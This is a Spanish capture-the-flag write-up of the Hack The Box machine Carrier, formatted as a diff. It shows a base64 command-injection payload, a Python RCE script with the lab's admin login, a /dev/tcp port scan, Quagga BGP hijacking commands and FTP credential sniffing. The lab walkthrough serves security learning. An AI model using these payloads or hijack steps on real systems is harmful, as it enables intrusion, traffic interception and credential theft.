+<p>Todo normal, pero ¿y siiii intentamos enviarle otra cadena en <strong>base64</strong>? Por ejemplo enviémosle la palabra <strong>hola</strong> encodeada:</p>
+
+<pre><code class="language-bash">❱ echo "hola" | base64
+aG9sYQo=
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155burp_diag_hola.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opa opa opaaaaa, nos muestra el comando que intenta hacer, lista los procesos del sistema y grepea por la cadena que enviamos en <strong>base64</strong> 🧐 ¿qué se les ocurre?</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>¿Y si además de grepear algo le decimos que ejecute algo más? Intentemos que nos devuelva el resultado del comando <code>id</code>:</p>
+
+<p>Para decirle que queremos ejecutar un comando aparte al que esta haciendo simplemente le indicamos un punto y coma (<code>;</code>), así ejecutara <code>grep ;lo_que_pongamos_acá</code>, o sea:</p>
+
+<pre><code class="language-bash">grep ; id
+</code></pre>
+
+<p>Veamos si es cierto:</p>
+
+<pre><code class="language-bash">❱ echo "; id" | base64
+OyBpZAo=
+</code></pre>
+
+<p>La enviamos yyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155burp_diag_id.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>POS MUY BIEEEEN!! Tenemos inyección de comandos :o Aprovechemos y generemos un script para automatizar el login, el encode y el envió del comando, así solo debemos preocuparnos por pasarle el comando al programa:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import base64, sys, signal
+import requests
+from bs4 import BeautifulSoup
+
+# CTRL+C
+def def_handler(sig, frame):
+    print()
+    exit(0)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Validamos que el usuario agregue un comando
+try:
+    command = sys.argv[1]
+except:
+    print("\n[-] Ejemplo: python3 %s id\n" % (sys.argv[0]))
+    exit(0)
+
+URL = "http://10.10.10.105"
+
+# RCE
+def exe_commands(command):
+    text_to_encode = "; " + command
+    payload = base64.b64encode(bytes(text_to_encode, 'utf-8')).decode('ascii')
+
+    data_post = {
+        "check": payload
+    }
+    r = session.post(URL + '/diag.php', data=data_post)
+    soup = BeautifulSoup(r.content, 'html.parser')
+
+    # Sabemos que nos devuelve el resultado del comando desde el segundo tag &lt;p&gt;...&lt;/p&gt;, 
+    # así que si queremos concatenar comandos o ejecutar algunos con un output grande (como `ls -la /`), 
+    # el for nos muestra su resultado con los siguentes &lt;p&gt;...&lt;/p&gt;
+    for i in range(1, 100):
+        try:
+            print(soup.find_all('p')[i].get_text())
+        except IndexError as e:
+            pass
+
+if __name__ == '__main__':
+    session = requests.Session()
+
+    # Login
+    data_post = {
+        "username": "admin",
+        "password": "NET_45JDX23"
+    }
+    r = session.post(URL, data=data_post)
+
+    exe_commands(command)
+</code></pre>
+
+<p>Listos, validamos:</p>
+
+<pre><code class="language-bash">❱ python3 lyghtwebRCE.py id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Pues ahora si indiquémosle que nos genere un reverse Shell, pongámonos en escucha:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Y ejecutamos el comando:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_nc_rootSH_r1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>TAMOOO DENTROOOOOOOOOOOOOOOOO (: Hagamos <a href="https://lanzt.gitbook.io/cheatsheet-pentest/tty">tratamiento de la TTY</a> para obtener una Shell completica y sigamos…</p>
+
+<p><em>Como vemos no estamos en la máquina host aún, nuestro <strong>hostname</strong> se llama <code>r1</code> y nuestra IP no es <code>10.10.10.105</code>, así que tendremos que saltar :)</em></p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios-bgp">Jugamos con el servicio BGP <a href="#escalada-de-privilegios-bgp">#</a></h2>
+
+<p>Si enumeramos el sistema vemos cositas que nos recuerdan que habíamos dejado un tema de lado.</p>
+
+<p>Vemos servicios activos:</p>
+
+<pre><code class="language-bash">root@r1:/# netstat -lnp
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_netstatLNP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un servicio llamado <code>bgpd</code> corriendo en dos puertos, el <code>2605</code> y el <code>179</code>. Y otro servicio llamado <code>zebra</code> corriendo en el puerto <code>2601</code>.</p>
+
+<h3 id="bgp-explain">Entendemos algo del protocolo BGP y sus características <a href="#bgp-explain">🔗</a></h3>
+
+<p>Les dejo un video muuuuy interesante para entender mejor el protocolo <code>BGP</code>:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=A1KXPpqlNZ4">YT - What is BGP (Border Gateway Protocol)? An Introduction</a>.</li>
+</ul>
+
+<p>Antes habíamos referenciado un <a href="https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246">artículo</a> para entender lo que había en esta imagen:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_diagram_for_tac.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>A él llegamos buscando info referente a <code>Lyghtspeed Networks</code> (de la imagen), profundizando en el post vemos unas cositas llamadas <code>AS</code> (Sistema Autónomo), ahí, en ese momento, si miramos nuestro diagrama también hay algo llamado <code>AS...</code>, es cuando nos damos cuenta de que hay muuucha probabilidad de que lo que encontramos (los servicios locales y lo que vimos en los tickets, (hablan mucho de <code>BGP</code>)) este relacionado con nuestro diagrama, así que descubramos si es así.</p>
+
+<p>Como ya reseñamos, el <a href="https://es.wikipedia.org/wiki/Border_Gateway_Protocol">protocolo <strong>BGP</strong></a> (Border Gateway Protocol) permite interconectar grandes grupos de redes, a cada gran red se le conoce como un <code>AS</code> <strong><em>(sistema autónomo)</em></strong> que se caracterizan por poseer una clara, independiente y única <strong><em>política</em></strong> de enrutamiento.</p>
+
+<p>🙋 ¿Se acuerdan que es un router? ¿Nop? Breeeves:
+<em>“Los routers guían y dirigen los datos de red mediante paquetes que contienen varios tipos de datos, como archivos, comunicaciones y transmisiones simples como interacciones web”</em>, <a href="https://www.cisco.com/c/es_mx/solutions/small-business/resource-center/networking/what-is-a-router.html"><em>cisco</em></a>.</p>
+
+<blockquote>
+  <p><strong>Característica fundamental de un Sistema Autónomo</strong>: realiza su propia gestión del tráfico que fluye entre él y los restantes Sistemas Autónomos que forman Internet. <a href="https://es.wikipedia.org/wiki/Sistema_aut%C3%B3nomo">Wikipedia</a>.</p>
+</blockquote>
+
+<p>Como bien dice el post sobre ataques <code>BGP</code>, el protocolo es como un pegamento y su función en -pegar- (conectar) toda la Internet.</p>
+
+<blockquote>
+  <p>“BGP is used for reachability information and routing data packets from one large network to another.” <a href="https://medium.com/r3d-buck3t/bgp-hijacking-attack-7e6a30711246">r3d-buck3t</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Si seguimos enumerando el sistema vemos este script en el directorio <code>/opt</code>:</p>
+
+<pre><code class="language-bash">root@r1:/opt$ cat restore.sh 
+#!/bin/sh
+systemctl stop quagga
+killall vtysh
+cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
+cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
+systemctl start quagga
+</code></pre>
+
+<p>Bien, algunas tareas llamativas y otro servicio, <a href="https://es.wikipedia.org/wiki/Quagga_(enrutador)">Quagga</a>, en internet encontramos que se trata de un software para enrutar y que su uso es muy parecido a la CLI de <code>cisco</code>. Entre los protocolos que soporta esta <code>BGP</code>, así que busquemos más sobre el software.</p>
+
+<p>Llegamos a este <a href="https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/">recurso</a> que nos ilustra con varios términos, archivos y líneas de comandos con las que podemos o no jugar :P</p>
+
+<p>Algo llamativo del script que vimos antes, es el archivo <code>/etc/quagga/bgpd.conf</code>:</p>
+
+<pre><code class="language-bash">root@r1:/opt$ cat /etc/quagga/bgpd.conf
+!
+! Zebra configuration saved from vty
+!   2018/07/02 02:14:27
+!
+route-map to-as200 permit 10
+route-map to-as300 permit 10
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+line vty
+!
+</code></pre>
+
+<p>Notamos las referencias hacia los “vecinos” (ya veremos que es esto) <code>AS200</code> y <code>AS300</code>, o sea que si ahora relacionamos el diagrama con estas IPs, podemos organizar nuestras ideas:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_doc_diagram_for_tac_withIPS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perfecto, con ayuda de <a href="https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/#neighbour">este recurso</a> sabemos que los “vecinos” son otros routers con los cuales podemos intercambiar información:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_bgp_neighbor.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, pero, de que nos sirve saber todo esto y como se supone que puede haber una explotación ahí, buaaa, pues facilito.</p>
+
+<p>Existe un ataque llamado <a href="https://www.cloudflare.com/learning/security/glossary/bgp-hijacking/">secuestro de rutas (BGP Hijacking)</a>, la labor es hacerle creer a un <strong>AS</strong> que existe una ruta mucho más corta para enviar la información y esa ruta más corta seremos nosotros en la mitad viendo todo el tráfico enviado 💀 (en resumidas palabras claramente), esta imagen de <a href="https://www.cloudflare.com/learning/security/glossary/bgp-hijacking/">cloudflare</a> da a entenderlo mejor:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_cloudflare_bgphijacking_technical_flow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_cloudflare_howorksBGPhijacking.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pueeeees, eso, ehhhh, veamos como romper esto (mucho info, estoy a 🤏 de que me explote la cabeza 😁, a darle)</p>
+
+<p>…</p>
+
+<p>Entonces tenemos que de alguna manera indicarle que el tráfico que sea que se esté generando entre <strong>AS200</strong> y <strong>AS300</strong> nos lo muestre a ya sea indicándole al <strong>AS200</strong> que nuestra ruta es más rápida para llegar a <strong>AS300</strong> o diciéndole a <strong>AS300</strong> que nuestra ruta es más rápida para llegar a <strong>AS200</strong>.</p>
+
+<p>Si revisamos nuestro reporte de tickets, podemos intuir cositas con respecto a los routers y sus servicios:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155page80_tickets_importanThings.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Quizás son pistas como pueda que no, pero hablan de un <strong>CVE</strong>, unos problemas de rutas por malas configuraciones, a <code>CastCom</code> (nuestro router <strong>AS300</strong>). Temas relacionados con un server en concreto que mantiene un <u>importante</u> servicio <code>FTP</code> y pruebas de inyección en rutas :P Muy loco e.e</p>
+
+<p>Lo de <code>FTP</code> suena interesante, porque nos podría estar diciendo que <code>CastCom</code> esta enviando data por <code>FTP</code>. Toma sentido el ataque para interceptar el tráfico, ¿no? Pero igual no sabemos en cuál IP de todo el segmento de <code>10.120.15.0/24</code> esta el servidor <strong>FTP</strong>, ni siquiera sabemos cuáles direcciones de ese segmento están activas, pues averigüémoslo:</p>
+
+<pre><code class="language-bash">root@r1:/tmp$ cat scanIPs.sh
+#!/bin/bash
+
+for ip in {1..255}; do
+    timeout 1 bash -c "echo '' &gt; /dev/tcp/10.120.15.$ip/21" 2&gt;/dev/null &amp;&amp; echo "[+] La IP 10.120.15.$ip tiene el puerto 21 abierto" &amp;
+done; wait
+</code></pre>
+
+<p>Le decimos que nos haga un bucle con 255 repeticiones, donde ese número será el último octeto de la IP. Para comprobar si existe una IP con ese PUERTO, enviara una traza por cada IP contra el puerto <code>21</code>, si en algún momento la respuesta no nos devuelve error pasa a ejecutar el siguiente comando, o sea, nos muestra la IP que tiene activo el puerto.</p>
+
+<p>Si lo ejecutamos, rápidamente vemos la IP:</p>
+
+<pre><code class="language-bash">root@r1:/tmp$ ./scanIPs.sh 
+[+] La IP 10.120.15.10 tiene el puerto 21 abierto
+</code></pre>
+
+<p>Pos perfecto, ya tenemos la IP.</p>
+
+<p>Si quisiéramos saber si existen más puertos abiertos en ella, podemos ya sea modificar el script colocando la IP completa y que el iterador ahora esté en el puerto, o usar <code>nc</code>, por ejemplo para ver el rango de puertos del <strong>20</strong> al <strong>10000</strong> y ver cuáles están abiertos:</p>
+
+<pre><code class="language-bash">root@r1:/tmp$ nc -z -v 10.120.15.10 20-10000 2&gt;&amp;1 | grep succeeded
+Connection to 10.120.15.10 21 port [tcp/ftp] succeeded!
+Connection to 10.120.15.10 22 port [tcp/ssh] succeeded!
+Connection to 10.120.15.10 53 port [tcp/domain] succeeded!
+</code></pre>
+
+<p>Tiene activo <code>SSH</code>, <code>FTP</code> y <code>DNS</code>, lindo. Pues sigamos, empecemos a interactuar con la consola de <code>Quagga</code> y los “vecinos” a ver como relacionamos esta IP con los <strong>AS</strong>.</p>
+
+<p>…</p>
+
+<h3 id="cli-quagga-vtysh">Exploramos CLI de <u>Quagga</u> <a href="#cli-quagga-vtysh">🔗</a></h3>
+
+<p>Buscando maneras de interactuar con <code>Quagga</code> encontramos:</p>
+
+<ul>
+  <li><a href="https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/#installing-quagga">BGP routing - Peering with <strong>Quagga</strong></a>.</li>
+  <li><a href="https://www.brianlinkletter.com/2016/06/how-to-build-a-network-of-linux-routers-using-quagga/">How to build a network of Linux routers using quagga</a>.</li>
+  <li><a href="https://youtu.be/Ovh_ceqp63M?t=149">YT : BGP Path Hijacking Attack Demo - mininet</a>.</li>
+</ul>
+
+<p>Para abrir la consola de comandos que se comunica con <strong>Quagga</strong> usamos el comando <code>vtysh</code>:</p>
+
+<pre><code class="language-bash">root@r1:/tmp$ vtysh 
+
+Hello, this is Quagga (version 0.99.24.1).
+Copyright 1996-2005 Kunihiro Ishiguro, et al.
+
+r1# 
+</code></pre>
+
+<p>Perfecto, ya estamos en las puertas del router <code>r1</code> y su configuración… Del video vemos un comando interesante y que nos devuelve data mucho más interesante:</p>
+
+<pre><code class="language-bash">r1# show ip bgp
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgp1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Donde vemos los tres <strong>AS</strong>’s y subrayado tenemos las rutas que hacen, por ejemplo la primera ruta para llegar más rápido a una IP del segmento <code>10.100.10.0/24</code> seria pasar por el <code>AS200</code> directamente y la segunda mejor ruta es ir del <code>AS300</code> al <code>AS200</code>.</p>
+
+<p>Encontramos <a href="https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute_bgp/command/irg-cr-book/bgp-s1.html#wp1745539073">este recurso de cisco</a> que nos indica dos cosas de lo que vemos:</p>
+
+<ul>
+  <li><code>*</code> hace referencia a una ruta válida.</li>
+  <li><code>&gt;</code> hace referencia a la mejor ruta.</li>
+</ul>
+
+<p>Bien, ya entendiendo el output, enfoquémonos en la IP relacionada con <code>FTP</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgp2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Las rutas para llegar más rápido a una IP del segmento <code>10.120.15.0/24</code> son: ir directamente a <code>AS300</code> o ir del <code>AS200</code> al <code>AS300</code>, acá es donde debemos nosotros como <code>AS100</code> buscar la manera de engañar al servidor y hacerle creer que pasar por nosotros es la ruta más rápida :) Así lograremos interceptar el tráfico…</p>
+
+<p>Si al comando que ejecutamos antes le agregamos una IP, nos muestra las rutas para llegar a esa IP:</p>
+
+<pre><code class="language-bash">r1# show ip bgp 10.120.15.10
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgpIP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perfecto, mucho más entendible por si algo 🛸</p>
+
+<p>…</p>
+
+<p>Después de algunas pruebas nos damos cuenta de que al crear una nueva red con respecto al segmento donde esta la IP que tiene el servidor <strong>FTP</strong>, se modifican las rutas:</p>
+
+<blockquote>
+  <p>Les paso links de los cuales recopile comandos e hice pruebas:</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/#configuring-bgp-ipv4">Configuring BGP (IPv4)</a>.</li>
+  <li><a href="https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking">BGP Prefix Hijack Attacks - ColoState</a>.</li>
+  <li><a href="https://www.cisco.com/c/es_mx/support/docs/ip/border-gateway-protocol-bgp/19345-bgp-noad.html">Solución de problemas cuando las rutas del BGP no están anunciadas</a>.</li>
+</ul>
+
+<p>Así que lo dicho, vamos a crear una red en el <code>AS100</code> (nosotros) que en su segmento de IPs contenga la que tiene el servidor FTP, validaremos las rutas de la nueva red eeee interceptaremos el tráfico que pase ahora por nuestro <code>AS100</code>:</p>
+
+<p><span style="color: yellow;">1. </span>Creamos red:</p>
+
+<pre><code class="language-bash">r1# conf t
+r1(config)# router bgp 100
+r1(config-router)# network 10.120.15.0/24
+</code></pre>
+
+<p>No voy a profundizar mucho en esto, pero me guiaré del comentario de <a href="https://es.quora.com/Qu%C3%A9-significan-los-dos-%C3%BAltimos-n%C3%BAmeros-de-una-direcci%C3%B3n-IP">Franco Ramírez en Quora</a> para que se entienda un poco la red <code>10.120.15.0/24</code>:</p>
+
+<p>Cada IP tiene 4 octetos, o sea, 4 “cajoncitos” (para ser gráficos) de 8 bits cada uno, por lo cual una IP tendría en total <code>32</code> bits (el cálculo de <code>8*4</code>). Perfecto, toma sentido esto:</p>
+
+<blockquote>
+  <p>“El número 24 nos dice que, de los 32 bits que constituyen la dirección, 24 le pertenecen a la red”, nos dice <a href="https://es.quora.com/Qu%C3%A9-significan-los-dos-%C3%BAltimos-n%C3%BAmeros-de-una-direcci%C3%B3n-IP">Franco</a>.</p>
+</blockquote>
+
+<p>Si usamos una <a href="https://www.iptp.net/es_ES/iptp-tools/ip-calculator/">calculadora de IPs</a>, vemos el rango de direcciones que podemos ahondar con esa red:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_ipcalculator_24ranges.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Crearemos una red que puede tomar IPs desde la <code>10.120.15.1</code> hasta la <code>10.120.15.254</code>, entre ellas esta la que nos interesa, <code>10.120.15.10</code>, perfecto.</p>
+
+<p><span style="color: yellow;">2. </span>Validamos la creación de la red y las rutas:</p>
+
+<pre><code class="language-bash">r1(config-router)# exit
+r1(config)# exit
+r1# show running-config
+...
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ network 10.120.15.0/24
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+...
+</code></pre>
+
+<p>Perfesto, vemos que la red ya esta en la configuración, validamos las rutas:</p>
+
+<pre><code class="language-bash">r1# show ip bgp
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgpNewETWORK.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora vemos que como ruta deseada por las IPs del segmento <code>10.120.15.0/24</code> estamos nosotros, <code>0.0.0.0</code> (: validemos si esto es cierto, usemos <code>tcpdump</code> para escuchar el tráfico que pase por cualquier interfaz y sobre el puerto <code>21</code> (FTP), guardamos todo en un archivo llamado <code>hola.pcap</code>:</p>
+
+<pre><code class="language-bash">r1# write
+</code></pre>
+
+<ul>
+  <li><a href="https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/">How to capture and analyze packets with tcpdump command on Linux</a>.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-bash">root@~:r1$ tcpdump -i any port 21 -w hola.pcap
+</code></pre>
+
+<p>Pero después de un rato, no se nos guarda nada en el archivo, por lo que sabemos que hay algo extraño que no permite aún interceptar el tráfico :(</p>
+
+<hr />
+
+<h3 id="fail-bgp-hijacking-ftp">Logramos <u>BGP Hijacking</u> pero con un fallito (tamos cerca) <a href="#fail-bgp-hijacking-ftp">🔗</a></h3>
+
+<p>Jugando y jugando, hay algo llamativo:</p>
+
+<p>Como ya vimos la red <code>10.120.15.0/24</code> nos pondrá a disposición <code>254</code> hosts, entre ellos el terminado en <code>10</code> que es el que necesitamos. Si aumentamos la máscara nos restara hosts, por ejemplo con la red <code>10.120.15.0/25</code> tendremos <code>126</code> hosts y también esta la <code>10</code>.</p>
+
+<p>Pero ¿y si debemos hacer que nuestra red sea lo más especifica posible y que apenas llegue la conexión se dirija si o si a nosotros?</p>
+
+<p>Pues si seguimos los ejemplos de arriba, podemos usar la red <code>10.120.15.0/28</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_ipcalculator_28ranges.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ella generará simplemente <code>14</code> hosts para repartir y si, entre ellos esta la que necesitamos, la <code>10</code>.</p>
+
+<p>Intentémoslo:</p>
+
+<pre><code class="language-bash">r1# conf t
+r1(config)# router bgp 100
+r1(config-router)# network 10.120.15.0/28
+r1(config-router)# exit
+r1(config)# exit
+r1# write
+Building Configuration...
+Configuration saved to /etc/quagga/zebra.conf
+Configuration saved to /etc/quagga/bgpd.conf
+[OK]
+r1#
+</code></pre>
+
+<p>Jugamos ahora con <code>tcpdump</code>:</p>
+
+<pre><code class="language-bash">root@~:r1$ tcpdump -i any port 21 -w hola.pcap
+</code></pre>
+
+<p>Yyyyyyyy después de un rato, si vemos el tamaño del archivoooooooooooooo:</p>
+
+<pre><code class="language-bash">root@~:r1$ ls -la 
+...
+-rw-r--r-- 1 root root 9592 Jul 29 25:25 hola.pcap
+...
+</code></pre>
+
+<p>OPAAAA, hay contenido, 9K, si le hacemos un <code>cat</code> no se entiende nada, así que movamos el archivo a nuestra máquina y lo abrimos con <code>wireshark</code>:</p>
+
+<pre><code class="language-bash">root@~:r1$ cat hola.pcap | base64 | tr -d '\n'
+</code></pre>
+
+<p>Lo tenemos en <strong>base64</strong>, copiamos tooodo y ahora:</p>
+
+<pre><code class="language-bash">❱ echo "todo_el_base64" | base64 -d &gt; hola.pcap
+❱ file hola.pcap 
+hola.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
+</code></pre>
+
+<p>Listones:</p>
+
+<pre><code class="language-bash"># Abrimos Wireshark en segundo plano y que no nos ocupe la terminal
+❱ (wireshark hola.pcap &gt;&amp; /dev/null &amp;)
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_wireshark_fail_RETRANSMISSION.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Jmmm, montón de errores en la transmisión, pero bueno, tenemos respuesta, vemos la comunicación entre <code>10.78.10.2</code> y <code>10.78.11.2</code> contra la IP <code>10.120.15.10</code>, por lo que vamos suuuuuuuper, ahora solo nos queda ver porque pasa esto…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_gif_minionsexcited.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>En internet encontramos esta definición del error:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_packetRetransmissionERROR.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>Tomada de <a href="https://www.dynatrace.com/news/blog/detecting-network-errors-impact-on-services/">dynatrace, “Detecting network errors and their impact on services”</a>.</p>
+</blockquote>
+
+<p>Varias cositas, quizás el paquete se pierda y no llega al destino (nosotros), hay algún bloqueo o como dice ahí, alguna congestión que evita que los paquetes viajen correctamente…</p>
+
+<p>…</p>
+
+<h3 id="done-bgp-hijacking-ftp"><u>BGP Hijacking</u> hecho y vemos credenciales en tráfico FTP <a href="#done-bgp-hijacking-ftp">🔗</a></h3>
+
+<p>🚢 Nutriéndonos de info sobre <code>BGP Hijacking</code> encontramos un <strong>POC</strong> con una estructura prácticamente igual a la que tenemos, solo que son diferentes IPs, pero, es igual, 3 routers y 2 de ellos comunicados mediante <strong>FTP</strong>:</p>
+
+<ul>
+  <li><a href="https://neff.blog/2019/06/05/bgphijacking-part2/">BGP Hijacking: Demo</a>.</li>
+</ul>
+
+<p>Hay una parte en la que agrega unas líneas distintas a las que hemos usado y al final nos muestra que su explotación fue hecha con éxito, así que podemos probar lo que tiene él:</p>
+
+<p>Nos explica que usa esas líneas (ya las veremos) porque el tráfico no alcanza a llegar al servidor <code>FTP</code>, ya que (en su ejemplo) el <em>router 3</em> reenvía el tráfico al <em>router 1</em> por un tema de “prefijos” (que serian como indicadores de un conjunto de direcciones). Entonces el tráfico queda como en bucle y cada <em>router</em> reenvía la data al otro.</p>
+
+<p>Por lo tanto él actualiza las políticas de enrutamiento en el <em>router 1</em> indicando que el tráfico sea reenviado totalmente hacia el <em>router 3</em>, lo que permite que el servidor <strong>FTP</strong> reciba las peticiones.</p>
+
+<blockquote>
+  <p>Pueees, suena como algo que nos pueda estar pasando, sigamoslo.</p>
+</blockquote>
+
+<p>Definimos un prefijo que contenga todos los hosts de nuestra red, se llamara <code>holacomoes</code>:</p>
+
+<pre><code class="language-bash">r1# conf t
+r1(config)# ip prefix-list holacomoes seq 5 permit 10.120.15.0/28
+</code></pre>
+
+<p>Evitamos que <code>AS100</code> comparta las direcciones de nuestro prefijo con <code>AS300</code>:</p>
+
+<pre><code class="language-bash">r1(config)# route-map to-as300 deny 5
+r1(config-route-map)# match ip address prefix-list holacomoes
+r1(config-route-map)# exit
+</code></pre>
+
+<p>Ahora permitimos que <code>AS100</code> comparta la lista de direcciones con <code>AS200</code>, peeero también le decimos (con <code>set ...</code>) que <code>AS200</code> no comparta sus prefijos (listas de direcciones) con otros routers:</p>
+
+<pre><code class="language-bash">r1(config)# route-map to-as200 permit 5
+r1(config-route-map)# match ip address prefix-list holacomoes
+r1(config-route-map)# set community no-export
+r1(config-route-map)# exit
+r1(config)# exit
+</code></pre>
+
+<p>Y ahora simplemente guardamos para que los cambios hagan efecto:</p>
+
+<pre><code class="language-bash">r1# clear ip bgp * out
+r1# write
+</code></pre>
+
+<p>Para ver como nos quedó la conf podemos ya sea ver el archivo <code>/etc/quagga/bgpd.conf</code> o usar:</p>
+
+<pre><code class="language-`bash">r1# show running-config
+</code></pre>
+
+<pre><code class="language-bash">...
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ network 10.120.15.0/28
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+ip prefix-list holacomoes seq 5 permit 10.120.15.0/28
+!
+route-map to-as300 deny 5
+ match ip address prefix-list holacomoes
+!
+route-map to-as200 permit 5
+ match ip address prefix-list holacomoes
+ set community no-export
+!
+route-map to-as200 permit 10
+!
+route-map to-as300 permit 10
+!
+...
+</code></pre>
+
+<p>Listo, pues pongámonos de nuevo en escucha con <code>tcpdump</code> y descubramos si hay algo nuevo en el tráfico:</p>
+
+<ol>
+  <li><code>tcpdump -i any port 21 -w hola.pcap</code></li>
+  <li>Esperamos un rato.
+    <ul>
+      <li>(Vemos que el tamaño del archivo es más grande, ¿nos emocionamos desde ya?)</li>
+    </ul>
+  </li>
+  <li>Copiamos el contenido del archivo, lo pasamos a <strong>base64</strong>.</li>
+  <li>Pegamos la cadena en nuestra máquina, generamos un archivo con ella.</li>
+  <li>Abrimos el paquete ya sea con <code>tshark</code> o <code>wireshark</code>:</li>
+</ol>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_wireshark_DONE_credentialsFTP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OPAAAAAAAAAAAAAAAAAAAAAAAa que se ve por ahííííííííí?????????? DIOSSSSSSSSSSSSSS</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_wireshark_packetFTPwithCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
